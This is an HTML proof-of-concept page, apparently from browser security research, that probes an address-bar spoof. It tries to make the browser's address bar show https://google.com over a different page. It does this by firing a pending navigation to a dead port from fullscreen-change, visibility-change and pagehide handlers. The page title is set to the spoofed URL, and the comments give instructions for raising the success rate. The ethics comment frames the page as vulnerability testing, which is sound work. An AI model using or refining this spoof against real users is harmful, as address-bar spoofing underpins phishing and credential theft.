<!DOCTYPE html>
<!--
============================================================================
 WEIRD-LAB address-bar spoof probe - gray-zone / flaky measurement. BENIGN.
============================================================================
 weird-lab operators: W6 reentrant (fire the desync from INSIDE fullscreenchange)
   + W2 teardown (also fire on pagehide/visibilitychange, when gates often relax).
 Doctrine: a FLAKY result = a bug whose window is not yet measured. This runs the
 nav-timing dead-port desync N times, records p = successes/N, and asks you to note
 the hidden variable (load/GC/focus/bg-tab) so you can WIDEN the window toward p->1.
 ORACLE: footer prints REAL location.href; you record whether the omnibox showed
 SPOOF on each run. Verdict is a NUMBER ("k/N; with bg-tab -> m/N"), never "sometimes".
 ETHICS: own browser only, bounded (no loop/crash), benign - prove -> STOP -> report.
============================================================================
-->
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>https://google.com</title>
<style>
 body{font:15px/1.6 system-ui,sans-serif;margin:0;padding:1rem;max-width:720px}
 button{font:inherit;padding:.5rem .9rem;border:1px solid #888;border-radius:8px;background:#fafafa;cursor:pointer}
 #log{font:12px/1.5 monospace;white-space:pre-wrap;background:#f2f2f2;border-radius:8px;padding:.7rem;margin-top:.8rem}
 @media(prefers-color-scheme:dark){body{background:#0f0f10;color:#e8eaed}#log{background:#1c1c1e}}
</style></head><body>
<h2>weird flaky-spoof probe</h2>
<p>Run <b>N</b> trials. After each, note in <code>#log</code> whether the omnibox showed <b>google.com</b> over this page (1) or kept the real URL (0). p = &Sigma;/N.</p>
<p><button id="go">Run trial (W6 reentrant + W2 teardown)</button>
   <button id="reset">reset counter</button></p>
<div id="log">REAL = <span id="real"></span>
p tracker: runs=0  hits=?  (you score each run 1/0 by eye)</div>
<script>
 var SPOOF="https://google.com", n=0;
 document.getElementById('real').textContent=location.href;
 function desync(tag){ // the mechanism under test: pending-URL dead-port desync
   try{location.href=SPOOF+':9090/#'+tag;}catch(e){}
 }
 // W6 reentrant: re-enter the gated moment from INSIDE its own state-change handler (bounded)
 var re=0;
 document.addEventListener('fullscreenchange',function(){ if(re++>1)return; desync('reentrant'); });
 // W2 teardown: gates often relax while the context is dying - fire there too
 document.addEventListener('visibilitychange',function(){ if(document.visibilityState==='hidden') desync('hidden'); });
 window.addEventListener('pagehide',function(){ desync('pagehide'); });
 function run(){
   n++; var L=document.getElementById('log');
   L.textContent=L.textContent.replace(/runs=\d+/,'runs='+n)+'\n#'+n+' fired: enter-fullscreen->reentrant desync; then background/close the tab to hit teardown. Score 1 if bar showed '+SPOOF+'.';
   try{document.documentElement.requestFullscreen&&document.documentElement.requestFullscreen();}catch(e){}
 }
 document.getElementById('go').addEventListener('click',run);
 document.getElementById('reset').addEventListener('click',function(){n=0;
   document.getElementById('log').textContent='REAL = '+location.href+'\np tracker: runs=0  hits=?';});
</script>
</body></html>
